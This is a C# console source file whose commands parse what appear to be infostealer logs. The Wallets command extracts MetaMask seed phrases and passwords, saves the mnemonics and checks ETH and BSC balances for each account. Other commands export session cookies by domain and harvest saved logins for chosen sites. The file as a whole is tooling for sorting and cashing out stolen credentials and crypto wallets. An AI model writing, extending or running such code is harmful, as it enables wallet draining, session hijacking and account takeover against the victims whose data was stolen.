using Console.Models;
using Console.Models.Abstractions;
using Console.Models.Attributes;
using Console.Models.Views;
using Core.Parsers;
using Core.Wallets;

namespace Console.Views;

public class MainView : ArgsView
{
    private readonly Settings _settings;
    private readonly Web3Config _cfgWeb3;
    private readonly ParsingConfig _cfgParse;
    private readonly DataService _data;
    
    public MainView(IRoot root, Settings settings, DataService data, Web3Config cfgWeb3, ParsingConfig cfgParse) : base(root)
    {
        _settings = settings;
        _data = data;
        _cfgWeb3 = cfgWeb3;
        _cfgParse = cfgParse;
    }

    [Command, Redirect]
    public Task Services() => Task.Run(() => Root.PushRedirect<ServicesView>());
    
    // [Command]
    public async Task Wallets()
    {
        var checker = new MetamaskChecker(_cfgWeb3.Eth, _cfgWeb3.Bsc);
        var wallets = new MetamaskParser().ByLogs(_settings.Path);

        await _data.SaveAsync("mnemonics", wallets.Select(x => x?.Mnemonic).Distinct());
        
        foreach (var wallet in wallets)
        {
            if (wallet is not {Mnemonic:not null, Password:not null} ||
                wallet.Mnemonic.Split(' ').Length != 12) continue;
            
            System.Console.WriteLine(wallet.Mnemonic);
            
            foreach (var account in wallet.Accounts.Values.OrderBy(x => x.Name))
            {
                System.Console.WriteLine(account.Name);
                System.Console.WriteLine(account.Address);
                
                foreach (var balance in await checker.Balance(account.Address))
                {
                    System.Console.WriteLine($"{balance.Key}: {balance.Value}");
                }
            }
        }

        _ExitWait();
    }

    [Command]
    public async Task Links()
    {
        await _data.SaveAsync("links", _cfgParse.Links.LinksFromLogs(_settings.Path).Select(x => x.ToString()));

        _ExitWait();
    }

    [Command]
    public async Task Cookies()
    {
        var data = _cfgParse.Cookies.CookiesFromLogs(_settings.Path);
        
        foreach (var (domain, cookies) in data)
        {
            await _data.SaveZipAsync("cookies", domain, cookies.ToArray());
        }

        _ExitWait();
    }
    
    [Command]
    public async Task Accounts()
    {
        if (_cfgParse.Accounts.Count == 0) return;
        
        var domains = await Root.Show(new PickView<string[]>(_cfgParse.Accounts));
        var accounts = domains.AccountsFromLogs(_settings.Path);
        
        foreach (var (domain, account) in accounts)
        {
            await _data.SaveAsync(domain, account.Select(x => x.ToStringShort()).Distinct());
        }

        _ExitWait();
    }
}